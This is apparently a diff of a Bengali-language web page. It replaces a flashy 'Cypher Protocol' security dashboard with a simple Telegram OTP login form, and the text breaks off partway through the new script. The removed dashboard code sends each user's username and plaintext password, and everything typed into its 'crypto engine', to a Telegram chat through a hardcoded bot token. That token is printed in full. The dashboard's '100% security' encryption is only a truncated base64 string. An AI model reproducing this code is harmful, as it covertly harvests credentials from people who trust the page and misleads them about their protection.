@@ -3,1004 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cypher Protocol - Security Dashboard</title>
-    <!-- FontAwesome for Icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>সিকিউরিটি ড্যাশবোর্ড - ওটিপি ভেরিফিকেশন</title>
     <style>
-        :root {
-            --bg-color: #030712;
-            --panel-bg: rgba(0, 0, 0, 0.88);
-            --text-color: #f8fafc;
-            --accent-color: #00ff41;
-            --border-color: #00ff41;
-            --glow-color: rgba(0, 255, 65, 0.6);
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Courier New', Courier, monospace;
-        }
-
-        body {
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            position: relative;
-            overflow-x: hidden;
-            transition: background 0.8s ease, color 0.8s ease;
-        }
-
-        /* পাইথন কোড লজিক ভিত্তিক অ্যাসকি আর্ট ব্যাকগ্রাউন্ড ক্যানভাস (অক্ষরের বৃষ্টি) */
-        #asciiCanvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-            opacity: 0.35;
-        }
-
-        /* ড্যাশবোর্ডের জন্য ম্যাট্রিক্স রেইন ক্যানভাস (অক্ষরের বৃষ্টি) */
-        #matrixCanvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-            display: none;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 950px;
-            background-color: var(--panel-bg);
-            border: 2px solid var(--accent-color);
-            border-radius: 16px;
-            padding: 30px;
-            box-shadow: 0 0 45px var(--glow-color);
-            position: relative;
-            z-index: 1;
-            transition: all 0.5s ease;
-        }
-
-        /* মোবাইল ভিউ মোড ক্লাস */
-        .container.mobile-mode {
-            max-width: 400px;
-            padding: 20px;
-            font-size: 13px;
-        }
-
-        .container.mobile-mode .grid {
-            grid-template-columns: 1fr;
-        }
-
-        /* লগইন স্ক্রিন বক্স */
-        #loginScreen {
-            display: block;
-            text-align: center;
-            max-width: 450px;
-            margin: 0 auto;
-            position: relative;
-        }
-
-        /* লগইন বক্সের ভেতরে ঠিক ডান কোণায় ডিভাইস সুইচ বাটন */
-        .corner-device-switch {
-            position: absolute;
-            top: -15px;
-            right: -10px;
-            background: #000;
-            border: 1px solid var(--accent-color);
-            color: var(--accent-color);
-            padding: 5px 10px;
-            border-radius: 20px;
-            font-size: 11px;
-            cursor: pointer;
-            font-weight: bold;
-            box-shadow: 0 0 10px var(--glow-color);
-            transition: 0.3s;
-            z-index: 10;
-        }
-        .corner-device-switch:hover {
-            background: var(--accent-color);
-            color: #000;
-        }
-
-        #loginScreen h2 {
-            color: var(--accent-color);
-            margin-bottom: 30px;
-            font-size: 24px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            text-shadow: 0 0 10px var(--accent-color);
-            position: relative;
-        }
-
-        #loginScreen h2::after {
-            content: "|";
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0; }
-        }
-
-        .input-group {
-            position: relative;
-            margin-bottom: 25px;
-            text-align: left;
-        }
-
-        .input-group i {
-            position: absolute;
-            top: 50%;
-            left: 15px;
-            transform: translateY(-50%);
-            color: var(--accent-color);
-            font-size: 18px;
-        }
-
-        .input-group input, .form-group select {
-            width: 100%;
-            padding: 15px 15px 15px 50px;
-            background: transparent;
-            border: 1px solid var(--accent-color);
-            border-radius: 5px;
-            color: #fff;
-            font-size: 16px;
-            outline: none;
-            transition: 0.4s;
-        }
-
-        .input-group input:focus {
-            border-color: #fff;
-            box-shadow: 0 0 10px var(--accent-color);
-        }
-
-        .input-group input::placeholder {
-            color: rgba(0, 255, 65, 0.5);
-        }
-
-        .toggle-password {
-            position: absolute;
-            top: 50%;
-            right: 15px;
-            left: auto !important;
-            transform: translateY(-50%);
-            color: var(--accent-color);
-            cursor: pointer;
-            font-size: 18px;
-            transition: 0.3s;
-        }
-        
-        .toggle-password:hover {
-            color: #fff;
-        }
-
-        .confirm-btn {
-            width: 100%;
-            padding: 15px;
-            background: transparent;
-            border: 2px solid var(--accent-color);
-            color: var(--accent-color);
-            font-size: 18px;
-            font-weight: bold;
-            letter-spacing: 2px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: 0.4s;
-            margin-top: 10px;
-            text-transform: uppercase;
-        }
-
-        .confirm-btn:hover {
-            background: var(--accent-color);
-            color: #000;
-            box-shadow: 0 0 20px var(--accent-color);
-        }
-
-        .system-status {
-            margin-top: 25px;
-            color: #fff;
-            font-size: 14px;
-        }
-
-        .system-status span {
-            color: var(--accent-color);
-            font-weight: bold;
-        }
-
-        /* হ্যাকার স্টাইল ভয়ঙ্কর লোডিং ওভারলে পপআপ */
-        #hackerLoadingOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(3, 7, 18, 0.95);
-            z-index: 9999;
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            text-align: center;
-        }
-
-        .terminal-box {
-            width: 90%;
-            max-width: 500px;
-            border: 2px solid var(--accent-color);
-            background: #000;
-            padding: 25px;
-            border-radius: 10px;
-            box-shadow: 0 0 30px var(--glow-color);
-            color: var(--accent-color);
-            font-family: 'Courier New', Courier, monospace;
-        }
-
-        .terminal-box h3 {
-            font-size: 18px;
-            margin-bottom: 15px;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            animation: warningBlink 0.5s infinite alternate;
-        }
-
-        @keyframes warningBlink {
-            from { opacity: 0.4; }
-            to { opacity: 1; }
-        }
-
-        .loader-bar {
-            width: 100%;
-            height: 12px;
-            border: 1px solid var(--accent-color);
-            background: #111;
-            margin: 20px 0;
-            border-radius: 6px;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .loader-progress {
-            width: 0%;
-            height: 100%;
-            background: var(--accent-color);
-            box-shadow: 0 0 10px var(--accent-color);
-            transition: width 0.05s linear;
-        }
-
-        .terminal-logs {
-            font-size: 12px;
-            color: #38bdf8;
-            height: 60px;
-            overflow: hidden;
-            text-align: left;
-            border-top: 1px dashed #333;
-            padding-top: 8px;
-        }
-
-        /* ড্যাশবোর্ড স্ক্রিন */
-        #dashboardScreen {
-            display: none;
-        }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 2px solid var(--border-color);
-            padding-bottom: 15px;
-            margin-bottom: 20px;
-            transition: border-color 0.8s ease;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-
-        .badge {
-            background: var(--accent-color);
-            color: #000;
-            padding: 6px 14px;
-            border-radius: 20px;
-            font-weight: bold;
-            font-size: 13px;
-            box-shadow: 0 0 15px var(--glow-color);
-            transition: all 0.8s ease;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-
-        @media (max-width: 768px) {
-            .grid { grid-template-columns: 1fr; }
-        }
-
-        .card {
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid var(--border-color);
-            padding: 20px;
-            border-radius: 10px;
-            transition: all 0.8s ease;
-        }
-
-        .card h3 {
-            font-size: 14px;
-            color: var(--accent-color);
-            margin-bottom: 12px;
-            text-transform: uppercase;
-            transition: color 0.8s ease;
-        }
-
-        .input-box {
-            width: 100%;
-            padding: 10px;
-            background: #000;
-            border: 1px solid var(--border-color);
-            color: #fff;
-            border-radius: 6px;
-            margin-bottom: 10px;
-            outline: none;
-        }
-
-        .btn {
-            background-color: transparent;
-            border: 2px solid var(--accent-color);
-            color: var(--accent-color);
-            padding: 8px 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 13px;
-            box-shadow: 0 0 10px var(--glow-color);
-            transition: all 0.3s ease;
-        }
-
-        .btn:hover { background: var(--accent-color); color: #000; transform: scale(1.02); }
-
-        .history-list {
-            background: #000;
-            color: #38bdf8;
-            padding: 10px;
-            border-radius: 6px;
-            font-size: 12px;
-            height: 180px;
-            overflow-y: auto;
-            border: 1px solid var(--border-color);
-        }
-
-        .history-item {
-            padding: 8px 0;
-            border-bottom: 1px dashed #1e293b;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .copy-btn {
-            background: #10b981;
-            color: white;
-            border: none;
-            padding: 3px 8px;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 10px;
-            font-weight: bold;
-        }
-        .copy-btn:hover { background: #059669; }
-
-        .mobile-toggle-btn {
-            background: transparent;
-            border: 2px solid #8b5cf6;
-            color: #8b5cf6;
-            padding: 6px 12px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-            font-size: 12px;
-            box-shadow: 0 0 10px rgba(139, 92, 246, 0.4);
-            transition: all 0.3s ease;
-        }
-        .mobile-toggle-btn:hover { background: #8b5cf6; color: #fff; }
-
-        .developer-panel {
-            background: rgba(0, 255, 65, 0.05);
-            border: 1px solid var(--accent-color);
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 12px;
-            margin-top: 15px;
-            transition: all 0.8s ease;
-        }
-
-        .developer-panel h4 {
-            color: var(--accent-color);
-            margin-bottom: 8px;
-            font-size: 13px;
-            text-transform: uppercase;
-            transition: color 0.8s ease;
-        }
-
-        .logout-btn {
-            border-color: #ef4444 !important;
-            color: #ef4444 !important;
-            box-shadow: 0 0 10px rgba(239, 68, 68, 0.4) !important;
-        }
-        .logout-btn:hover {
-            background-color: #ef4444 !important;
-            color: #fff !important;
-        }
-
-        .controls-row {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-            align-items: center;
-        }
+        body { font-family: Arial, sans-serif; background-color: #f4f6f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 4px 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { background-color: #007bff; color: white; border: none; padding: 10px; width: 100%; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #0056b3; }
+        .message { margin-top: 15px; font-weight: bold; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <!-- পাইথন কোড লজিক ভিত্তিক অ্যাসকি আর্ট ব্যাকগ্রাউন্ড ক্যানভাস (অক্ষরের বৃষ্টি) -->
-    <canvas id="asciiCanvas"></canvas>
-    <!-- ড্যাশবোর্ডের জন্য ম্যাট্রিক্স রেইন ক্যানভাস (অক্ষরের বৃষ্টি) -->
-    <canvas id="matrixCanvas"></canvas>
-
-    <!-- হ্যাকার স্টাইল ভয়ঙ্কর লোডিং ওভারলে পপআপ -->
-    <div id="hackerLoadingOverlay">
-        <div class="terminal-box">
-            <h3 id="loaderTitle">⚠️ SECURITY PROTOCOL ⚠️</h3>
-            <p id="loaderSubtitle">Processing secure request...</p>
-            <div class="loader-bar">
-                <div class="loader-progress" id="loaderProgress"></div>
-            </div>
-            <div class="terminal-logs" id="terminalLogs">
-                > Initializing secure tunnel...<br>
-                > Executing background sequence...
-            </div>
-        </div>
-    </div>
-
-    <div class="container" id="mainContainer">
+    <div class="card">
+        <h2>🔒 সিকিউরিটি লগইন</h2>
         
-        <!-- ১. লগইন স্ক্রিন -->
-        <div id="loginScreen">
-            <!-- কোণায় মোবাইল/ডেস্কটপ সুইচ বাটন -->
-            <button type="button" class="corner-device-switch" id="cornerDeviceBtn">
-                <i class="fa-solid fa-mobile-screen-button" id="deviceIcon"></i> <span id="deviceText">মোবাইল মোড</span>
-            </button>
-
-            <h2>CYPHER PROTOCOL</h2>
-            
-            <div class="input-group">
-                <i class="fa-solid fa-terminal"></i>
-                <input type="text" id="usernameInput" placeholder="AGENT ID / USERNAME" required>
-            </div>
-
-            <div class="input-group">
-                <i class="fa-solid fa-lock"></i>
-                <input type="password" id="passwordInput" placeholder="ACCESS KEY / PASSWORD" required>
-                <i class="fa-solid fa-eye toggle-password" id="togglePassword"></i>
-            </div>
-
-            <button type="button" class="confirm-btn" id="loginButton">Initiate Connection</button>
-
-            <div class="system-status">Status: <span>[ SECURE ]</span> - Awaiting Authorization</div>
+        <!-- ওটিপি পাঠানোর ফর্ম -->
+        <div id="step-1">
+            <p>আপনার টেলিগ্রাম ইউজারনেম দিন (যেমন: @username)</p>
+            <input type="text" id="username" placeholder="Telegram Username">
+            <button onclick="sendOtp()">ওটিপি পাঠান</button>
         </div>
 
-        <!-- ২. ড্যাশবোর্ড স্ক্রিন -->
-        <div id="dashboardScreen">
-            <div class="header">
-                <div>
-                    <h2 id="welcomeText" style="color: var(--accent-color);">স্বাগতম!</h2>
-                    <p style="font-size: 12px; opacity: 0.8;" id="loginMeta">সেশন সিকিউরড</p>
-                </div>
-                <div style="display: flex; gap: 8px; align-items: center; flex-wrap: wrap;">
-                    <div id="themeBadge" class="badge">লেভেল ১ (সাধারণ)</div>
-                    <button type="button" class="mobile-toggle-btn" id="mobileToggleBtn">📱 মোবাইল ভিউ</button>
-                    <button type="button" class="btn logout-btn" id="logoutButton">লগআউট</button>
-                </div>
-            </div>
-
-            <div class="grid">
-                <!-- ক্রিপ্টোগ্রাফি কন্ট্রোল প্যানেল -->
-                <div class="card">
-                    <h3 id="cardHeader">ক্রিপ্টোগ্রাফি ইঞ্জিন</h3>
-                    
-                    <div class="form-group" style="margin-bottom: 10px;">
-                        <label style="font-size: 11px; color: var(--accent-color); display:block; margin-bottom:5px;">নিরাপত্তা লেভেল নির্বাচন করুন:</label>
-                        <select id="securityLevelSelect" class="input-box">
-                            <option value="1" style="background:#000;">লেভেল ১: সাধারণ (Basic)</option>
-                            <option value="2" style="background:#000;">লেভেল ২: কঠিন (Medium)</option>
-                            <option value="3" style="background:#000;">লেভেল ৩: এক্সট্রিম কঠিন (High)</option>
-                            <option value="4" style="background:#000;">লেভেল ৪: ১০০% শতভাগ নিরাপত্তা (Max - Red Matrix)</option>
-                        </select>
-                    </div>
-
-                    <input type="text" id="userInputText" class="input-box" placeholder="টেক্সট লিখে প্রসেস করুন বা এনক্রিপ্টেড কোড পেস্ট করুন...">
-                    
-                    <div class="controls-row">
-                        <button type="button" class="btn" id="encryptBtn">ইনক্রিপ্ট (Encrypt)</button>
-                        <button type="button" class="btn" id="decryptBtn" style="border-color: #10b981; color: #10b981;">ডিক্রিপ্ট (Decrypt)</button>
-                    </div>
-
-                    <p style="font-size: 13px; margin-top: 10px;">
-                        <strong>সর্বশেষ আউটপুট:</strong> 
-                        <span id="outputResult" style="color: #38bdf8; word-break: break-all;">--</span>
-                        <button type="button" class="copy-btn" id="mainCopyBtn" style="margin-left: 8px;">কপি</button>
-                    </p>
-                </div>
-
-                <!-- পার্মানেন্ট হিস্ট্রি চ্যাট বক্স -->
-                <div class="card">
-                    <h3>পার্মানেন্ট হিস্ট্রি চ্যাট বক্স</h3>
-                    <div class="history-list" id="historyListContainer"></div>
-                </div>
-            </div>
-
-            <!-- ডেভেলপার ইনফো প্যানেল -->
-            <div class="developer-panel">
-                <h4>🛡️ ডেভেলপার ও সিস্টেম ইনফো</h4>
-                <p>👤 <b>ডেভলপার নাম:</b> NILOY GHOSH</p>
-                <p>🆔 <b>ID:</b> 7938556654 | 🌐 <b>DC ID:</b> 5 | 🌍 <b>Lang:</b> en</p>
-                <p>🔗 <b>Username:</b> @CipherSentinel_BD</p>
-                <p style="margin-top: 5px; color: #38bdf8;">📣 সাপোর্ট এবং যোগাযোগের জন্য টেলিগ্রাম এ যোগাযোগ করুন: <b>@DeIIIeted</b></p>
-            </div>
+        <!-- ওটিপি ভেরিফাই করার ফর্ম -->
+        <div id="step-2" style="display: none; margin-top: 15px;">
+            <p>টেলিগ্রামে যাওয়া ৪ ডিজিটের ওটিপি কোডটি লিখুন</p>
+            <input type="text" id="otp-code" placeholder="Enter 4-digit OTP">
+            <button onclick="verifyOtp()">লগইন করুন</button>
         </div>
+
+        <div class="message" id="response-msg"></div>
     </div>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs";
-        const TELEGRAM_CHAT_ID = "7938556654";
+        let currentUsername = "";
 
-        const levelConfigs = {
-            1: { name: "লেভেল ১ (সাধারণ)", matrixColor: "#00ff41" },
-            2: { name: "লেভেল ২ (কঠিন)", matrixColor: "#10b981" },
-            3: { name: "লেভেল ৩ (এক্সট্রিম কঠিন)", matrixColor: "#f59e0b" },
-            4: { name: "লেভেল ৪ (১০০% শতভাগ নিরাপত্তা)", matrixColor: "#ef4444" }
-        };
+        function sendOtp() {
+            const usernameInput = document.getElementById('username').value.trim();
+            const msgDiv = document.getElementById('response-msg');
 
-        let currentUser = null;
-        let currentPassword = null;
-        let userHistory = [];
-        let asciiInterval = null;
-        let matrixInterval = null;
-        let currentMatrixColor = "#00ff41";
-        let loginTime = null;
-        let encryptionMapping = {};
-
-        function sendTelegramNotification(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const data = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" };
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            }).catch(error => console.error("Telegram Error:", error));
-        }
-
-        function getSessionDuration() {
-            if (!loginTime) return "০ সেকেন্ড";
-            const diffMs = Date.now() - loginTime;
-            const diffSec = Math.floor(diffMs / 1000);
-            const mins = Math.floor(diffSec / 60);
-            const secs = diffSec % 60;
-            return mins > 0 ? `${mins} মিনিট ${secs} সেকেন্ড` : `${secs} সেকেন্ড`;
-        }
-
-        // লগইন স্ক্রিনের জন্য পাইথন কোড লজিক ভিত্তিক অ্যাসকি আর্ট অক্ষরের বৃষ্টি
-        function initPythonAsciiRain() {
-            const canvas = document.getElementById('asciiCanvas');
-            if (!canvas) return;
-            const ctx = canvas.getContext('2d');
-
-            function resizeCanvas() {
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-            }
-            resizeCanvas();
-            window.addEventListener('resize', resizeCanvas);
-
-            const asciiChars = ["@", "#", "S", "%", "?", "*", "+", ";", ":", ",", ".", "0", "1", "X", "Z"];
-            const fontSize = 14;
-            const columns = Math.floor(canvas.width / fontSize);
-            const drops = [];
-
-            for (let i = 0; i < columns; i++) {
-                drops[i] = 1;
-            }
-
-            if (asciiInterval) clearInterval(asciiInterval);
-
-            asciiInterval = setInterval(() => {
-                ctx.fillStyle = 'rgba(3, 7, 18, 0.2)';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-                ctx.fillStyle = '#00ff41';
-                ctx.font = fontSize + 'px monospace';
-
-                for (let i = 0; i < drops.length; i++) {
-                    const text = asciiChars[Math.floor(Math.random() * asciiChars.length)];
-                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                        drops[i] = 0;
-                    }
-                    drops[i]++;
-                }
-            }, 40);
-        }
-
-        // ড্যাশবোর্ডের জন্য ম্যাট্রিক্স রেইন অক্ষরের বৃষ্টি
-        function initMatrixRain() {
-            const canvas = document.getElementById('matrixCanvas');
-            if (!canvas) return;
-            const ctx = canvas.getContext('2d');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-
-            const chars = 'АБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ0123456789@#?*+';
-            const fontSize = 16;
-            const columns = canvas.width / fontSize;
-            const drops = Array(Math.floor(columns)).fill(1);
-
-            if (matrixInterval) clearInterval(matrixInterval);
-
-            matrixInterval = setInterval(() => {
-                ctx.fillStyle = 'rgba(3, 7, 18, 0.15)';
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-                ctx.fillStyle = currentMatrixColor;
-                ctx.font = fontSize + 'px monospace';
-
-                for (let i = 0; i < drops.length; i++) {
-                    const text = chars.charAt(Math.floor(Math.random() * chars.length));
-                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-
-                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-                        drops[i] = 0;
-                    }
-                    drops[i]++;
-                }
-            }, 33);
-        }
-
-        function applySecurityLevelTheme(levelNum) {
-            const config = levelConfigs[levelNum];
-            if (!config) return;
-            currentMatrixColor = config.matrixColor;
-            const root = document.documentElement.style;
-
-            if (levelNum == 4) {
-                root.setProperty('--accent-color', '#ef4444');
-                root.setProperty('--border-color', '#ef4444');
-                root.setProperty('--glow-color', 'rgba(239, 68, 68, 0.6)');
-            } else if (levelNum == 3) {
-                root.setProperty('--accent-color', '#f59e0b');
-                root.setProperty('--border-color', '#f59e0b');
-                root.setProperty('--glow-color', 'rgba(245, 158, 11, 0.6)');
-            } else if (levelNum == 2) {
-                root.setProperty('--accent-color', '#10b981');
-                root.setProperty('--border-color', '#10b981');
-                root.setProperty('--glow-color', 'rgba(16, 185, 129, 0.6)');
-            } else {
-                root.setProperty('--accent-color', '#00ff41');
-                root.setProperty('--border-color', '#00ff41');
-                root.setProperty('--glow-color', 'rgba(0, 255, 65, 0.6)');
-            }
-
-            const badgeEl = document.getElementById('themeBadge');
-            if (badgeEl) badgeEl.innerText = levelConfigs[levelNum].name;
-
-            const cardHeaderEl = document.getElementById('cardHeader');
-            if (cardHeaderEl) cardHeaderEl.innerText = `ক্রিপ্টোগ্রাফি ইঞ্জিন [${levelConfigs[levelNum].name}]`;
-
-            // যদি ড্যাশবোর্ড মোডে থাকে তবে ম্যাট্রিক্স রেইন কালার সাথে সাথে আপডেট হবে
-            if (document.getElementById('dashboardScreen').style.display !== 'none') {
-                initMatrixRain();
-            }
-        }
-
-        function copyTextToClipboard(text, btnElement) {
-            if (!text || text === "--") {
-                alert("কপি করার মতো কিছু নেই!");
-                return;
-            }
-            navigator.clipboard.writeText(text).then(() => {
-                const originalText = btnElement.innerText;
-                btnElement.innerText = "কপি হয়েছে!";
-                setTimeout(() => { btnElement.innerText = originalText; }, 1500);
-            });
-        }
-
-        // হ্যাকার স্টাইল ভয়ঙ্কর লোডিং ইফেক্ট (লগইন এর জন্য)
-        function triggerHackerLoadingAndLogin() {
-            const user = document.getElementById('usernameInput').value.trim();
-            const pass = document.getElementById('passwordInput').value.trim();
-
-            if (!user || !pass) {
-                alert("দয়া করে এজেন্ট আইডি এবং পাসওয়ার্ড দিন!");
+            if (!usernameInput) {
+                msgDiv.style.color = "red";
+                msgDiv.innerText = "দয়া করে ইউজারনেম লিখুন!";
                 return;
             }
 
-            currentUser = user;
-            currentPassword = pass;
-            loginTime = Date.now();
+            currentUsername = usernameInput;
+            msgDiv.style.color = "blue";
+            msgDiv.innerText = "ওটিপি পাঠানো হচ্ছে...";
 
-            const overlay = document.getElementById('hackerLoadingOverlay');
-            const progressBar = document.getElementById('loaderProgress');
-            const terminalLogs = document.getElementById('terminalLogs');
-            document.getElementById('loaderTitle').innerText = "⚠️ SECURITY BREACH PROTOCOL ⚠️";
-            document.getElementById('loaderSubtitle').innerText = "Authenticating credentials & bypassing firewall...";
-            overlay.style.display = 'flex';
-
-            let progress = 0;
-            const logSteps = [
-                "> Bypassing firewall matrix...",
-                "> Injecting security payload...",
-                "> Verifying encryption keys...",
-                "> Access granted. Welcome agent!"
-            ];
-
-            let stepIdx = 0;
-            const loadingInterval = setInterval(() => {
-                progress += 4;
-                progressBar.style.width = progress + '%';
-
-                if (progress % 25 === 0 && stepIdx < logSteps.length) {
-                    terminalLogs.innerHTML += "<br>" + logSteps[stepIdx];
-                    stepIdx++;
-                }
-
-                if (progress >= 100) {
-                    clearInterval(loadingInterval);
-                    overlay.style.display = 'none';
-
-                    const loginMsg = `🔐 <b>নতুন লগইন নোটিফিকেশন!</b>\n👤 এজেন্ট আইডি: <b>${user}</b>\n🔑 পাসওয়ার্ড: <b>${pass}</b>\n🕒 লগইন সময়: ${new Date().toLocaleString()}`;
-                    sendTelegramNotification(loginMsg);
-
-                    const savedDataKey = `sec_user_${user}_${pass}`;
-                    userHistory = localStorage.getItem(savedDataKey) ? JSON.parse(localStorage.getItem(savedDataKey)) : [];
-
-                    const mapKey = `sec_map_${user}_${pass}`;
-                    encryptionMapping = localStorage.getItem(mapKey) ? JSON.parse(localStorage.getItem(mapKey)) : {};
-
-                    document.getElementById('asciiCanvas').style.display = 'none';
-                    document.getElementById('matrixCanvas').style.display = 'block';
-                    initMatrixRain();
-
-                    document.getElementById('loginScreen').style.display = 'none';
-                    document.getElementById('dashboardScreen').style.display = 'block';
-                    document.getElementById('welcomeText').innerText = `স্বাগতম, ${user}!`;
-                    document.getElementById('loginMeta').innerText = `সেশন ভেরিফাইড | সংরক্ষিত হিস্ট্রি: ${userHistory.length}টি`;
-
-                    renderHistoryList();
-                }
-            }, 30);
-        }
-
-        // হ্যাকার স্টাইল ভয়ঙ্কর লোডিং ইফেক্ট (ইনক্রিপ্ট/ডিক্রিপ্ট এর জন্য)
-        function triggerCryptoLoading(actionType) {
-            const textInput = document.getElementById('userInputText');
-            let text = textInput.value.trim();
-            if (!text) {
-                alert("প্রথমে কিছু টেক্সট লিখুন বা পেস্ট করুন!");
-                return;
-            }
-
-            const overlay = document.getElementById('hackerLoadingOverlay');
-            const progressBar = document.getElementById('loaderProgress');
-            const terminalLogs = document.getElementById('terminalLogs');
-            const currentLevelNum = document.getElementById('securityLevelSelect').value;
-
-            document.getElementById('loaderTitle').innerText = `⚠️ CRYPTO ENGINE [L${currentLevelNum}] ⚠️`;
-            document.getElementById('loaderSubtitle').innerText = `Executing ${actionType.toUpperCase()} sequence...`;
-            terminalLogs.innerHTML = `> Establishing secure hash channel...<br> > Processing data block with L${currentLevelNum} matrix...`;
-            overlay.style.display = 'flex';
-
-            let progress = 0;
-            const loadingInterval = setInterval(() => {
-                progress += 5;
-                progressBar.style.width = progress + '%';
-
-                if (progress >= 100) {
-                    clearInterval(loadingInterval);
-                    overlay.style.display = 'none';
-                    processEncryptionDecryptionAction(actionType, text);
-                }
-            }, 25);
-        }
-
-        function processEncryptionDecryptionAction(actionType, text) {
-            const currentLevelNum = document.getElementById('securityLevelSelect').value;
-            const timeStr = new Date().toLocaleTimeString();
-            let resultOutput = "";
-
-            if (actionType === 'encrypt') {
-                const token = btoa(text).substring(0, 12);
-                resultOutput = `🔒 L${currentLevelNum}_Enc_${token}`;
-                encryptionMapping[resultOutput] = text;
-                encryptionMapping[token] = text;
-            } else {
-                let cleanInput = text.includes('_Enc_') ? text.split('_Enc_')[1] : text;
-                if (encryptionMapping[text]) {
-                    resultOutput = encryptionMapping[text];
-                } else if (encryptionMapping[cleanInput]) {
-                    resultOutput = encryptionMapping[cleanInput];
+            fetch('/send-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username: currentUsername })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    msgDiv.style.color = "green";
+                    msgDiv.innerText = data.message;
+                    document.getElementById('step-1').style.display = 'none';
+                    document.getElementById('step-2').style.display = 'block';
                 } else {
-                    try {
-                        resultOutput = atob(cleanInput);
-                    } catch (e) {
-                        resultOutput = `⚠️ ডিক্রিপশন ব্যর্থ! সঠিক এনক্রিপ্টেড টেক্সট দিন।`;
-                    }
+                    msgDiv.style.color = "red";
+                    msgDiv.innerText = data.message;
                 }
-            }
-
-            document.getElementById('outputResult').innerText = resultOutput;
-            userHistory.unshift({ type: actionType.toUpperCase(), level: currentLevelNum, input: text, output: resultOutput, time: timeStr });
-
-            localStorage.setItem(`sec_user_${currentUser}_${currentPassword}`, JSON.stringify(userHistory));
-            localStorage.setItem(`sec_map_${currentUser}_${currentPassword}`, JSON.stringify(encryptionMapping));
-
-            renderHistoryList();
-            document.getElementById('userInputText').value = "";
-
-            const actionMsg = `⚡ <b>${actionType.toUpperCase()} (লেভেল ${currentLevelNum}) নোটিফিকেশন!</b>\n👤 ইউজার: <b>${currentUser}</b>\n⏱️ সময়: <b>${getSessionDuration()}</b>\n📥 ইনপুট: ${text}\n📤 আউটপুট: ${resultOutput}`;
-            sendTelegramNotification(actionMsg);
+            })
+            .catch(error => {
+                msgDiv.style.color = "red";
+                msgDiv.innerText = "সার্ভার এরর!";
+                console.error('Error:', error);
+            });
         }
 
-        function renderHistoryList() {
-            const container = document.getElementById('historyListContainer');
-            container.innerHTML = "";
-            if (userHistory.length === 0) {
-                container.innerHTML = "<div style='color: #64748b; text-align: center; padding: 20px;'>কোনো হিস্ট্রি নেই।</div>";
+        function verifyOtp() {
+            const otpInput = document.getElementById('otp-code').value.trim();
+            const msgDiv = document.getElementById('response-msg');
+
+            if (!otpInput) {
+                msgDiv.style.color = "red";
+                msgDiv.innerText = "ওটিপি কোড দিন!";
                 return;
             }
-            userHistory.forEach((item) => {
-                const div = document.createElement('div');
-                div.className = 'history-item';
-                div.innerHTML = `
-                    <div style="max-width: 75%; overflow: hidden; text-overflow: ellipsis;">
-                        [${item.time}] <b>${item.type} (L${item.level})</b>: ${item.input} ➔ <span style="color:#10b981;">${item.output}</span>
-                    </div>
-                    <button type="button" class="copy-btn">কপি</button>
-                `;
-                div.querySelector('button').onclick = (e) => copyTextToClipboard(item.output, e.target);
-                container.appendChild(div);
-            });
-        }
 
-        function executeUserLogout() {
-            const duration = getSessionDuration();
